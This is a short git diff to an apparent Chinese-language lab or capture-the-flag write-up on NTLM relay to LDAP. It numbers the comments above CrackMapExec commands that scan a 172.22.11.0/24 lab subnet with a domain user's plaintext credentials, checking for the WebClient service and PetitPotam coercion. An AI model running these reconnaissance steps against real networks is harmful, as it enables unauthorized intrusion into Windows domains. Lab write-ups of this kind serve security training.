@@ -17,11 +17,11 @@ relay 到 ldap 也要求被攻击机器不开启 ldap 签名，而默认情况�
 
 
 ```sh
-# 检测内网启动了 WebClient 服务的机器：
+# M1. 检测内网启动了 WebClient 服务的机器：
 python cme smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav
 # 以及 check PetitPotam 是否能够进行强制触发，这里有对于强制触发的总结。
 python cme smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M PetitPotam
-## 或者下面
+## M2. 或者下面
 proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M Webdav
 proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -d xiaorang.lab -M PetitPotam
 
